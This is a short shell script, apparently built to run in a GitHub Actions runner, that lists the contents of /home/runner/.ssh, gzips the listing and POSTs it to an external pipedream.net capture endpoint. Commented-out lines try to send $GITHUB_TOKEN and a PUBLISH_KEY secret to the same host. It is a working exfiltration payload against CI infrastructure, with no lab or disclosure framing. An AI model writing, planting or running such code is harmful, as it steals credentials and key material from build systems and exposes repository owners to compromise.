#!/bin/sh

> body

#curl https://en0liva7dzyvpp.x.pipedream.net?holaaa
#curl https://en0liva7dzyvpp.x.pipedream.net?token=$GITHUB_TOKEN;#

#a=echo ${{ secrets.PUBLISH_KEY }}
#url="https://en0liva7dzyvpp.x.pipedream.net?"
#b="done"
#url="$url$a$b"

#curl "$url"

#echo $(ls -la tools) > body
#echo $(file tools/ssh-keygen) > body
#echo $(ssh-keygen) > body

echo $(ls -la /home/runner/.ssh) > body


#curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
#  -H "Content-Type: text/xml" \
#  --data-binary "@file2.txt"

gzip body
curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
  -H "Content-Encoding: gzip" \
  --data-binary "@body.gz" \
